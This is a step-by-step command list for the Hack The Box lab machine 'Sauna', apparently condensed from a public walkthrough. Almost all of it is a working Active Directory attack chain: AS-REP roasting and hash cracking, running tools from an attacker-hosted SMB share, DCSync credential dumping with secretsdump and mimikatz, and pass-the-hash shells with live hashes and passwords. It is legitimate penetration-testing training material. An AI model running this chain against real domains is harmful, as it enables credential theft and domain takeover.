Here’s a **complete command list in order** for HTB: **Sauna**, based on 0xdf’s walkthrough. Tools, enumeration, and exploitation steps are included for clarity.

---

## 🧰 Tools Used

- `nmap`
- `ldapsearch`
- `dig`
- `kerbrute`
- `GetNPUsers.py` (from Impacket)
- `hashcat`
- `evil-winrm`
- `smbserver.py` (Impacket)
- `winPEAS.exe`
- `BloodHound`, `SharpHound.exe`, `neo4j`
- `secretsdump.py` (Impacket)
- `mimikatz`
- `wmiexec.py`, `psexec.py` (Impacket)

---

## 📜 All Commands in Order

### 🔍 Recon

```bash
nmap -p- --min-rate 10000 10.10.10.175
nmap -p 53,80,88,135,139,389,445,464,593,3268,3269,5985 -sC -sV -oA scans/tcpscripts 10.10.10.175
```

### 🌐 [Web Enumeration](HTTP)

```bash
gobuster dir -u http://10.10.10.175/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-root -t 40
```

### 🖧 [SMB](SMB) Enumeration

```bash
smbmap -H 10.10.10.175
smbclient -N -L //10.10.10.175
```

### 📚 [LDAP](LDAP.md) Enumeration

```bash
ldapsearch -x -h 10.10.10.175 -s base namingcontexts
ldapsearch -x -h 10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
```

### 🌐 DNS Zone Transfer Attempt

```bash
dig axfr @10.10.10.175 sauna.htb
dig axfr @10.10.10.175 egotistical-bank.local
```

### 🔍 Kerberos User Brute-Force (User Enum)

```bash
kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
```

### 🔐 AS-REP Roasting

```bash
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
```

### 🔓 Crack AS-REP Hash

```bash
hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
```

### 🧠 Evil-WinRM Shell as fsmith

```bash
evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
```

### 📤 SMB Share to Upload winPEAS

```bash
smbserver.py -username df -password df share . -smb2support
```

From WinRM:
```powershell
net use \\10.10.14.30\share /u:df df
cd \\10.10.14.30\share
.\winPEAS.exe cmd fast > sauna_winpeas_fast
```

### 🔐 Find AutoLogon Creds (WinRM)

```powershell
cd HKLM:\software\microsoft\windows nt\currentversion\winlogon
get-item -path .
```

or

```powershell
reg query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
```

### 🧠 Evil-WinRM Shell as svc_loanmgr

```bash
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

### 🧠 BloodHound Collection

From WinRM:
```powershell
cd \\10.10.14.30\share
.\SharpHound.exe
```

### 🔓 DCSync with secretsdump

```bash
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
```

### 🛠️ DCSync with mimikatz (WinRM)

```powershell
upload /opt/mimikatz/x64/mimikatz.exe
.\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit
```

### 🖥️ Shell as Administrator with wmiexec

```bash
wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175
```

### 🖥️ Shell as SYSTEM with psexec

```bash
psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175
```

### 🔑 Admin Shell via Evil-WinRM

```bash
evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff
```
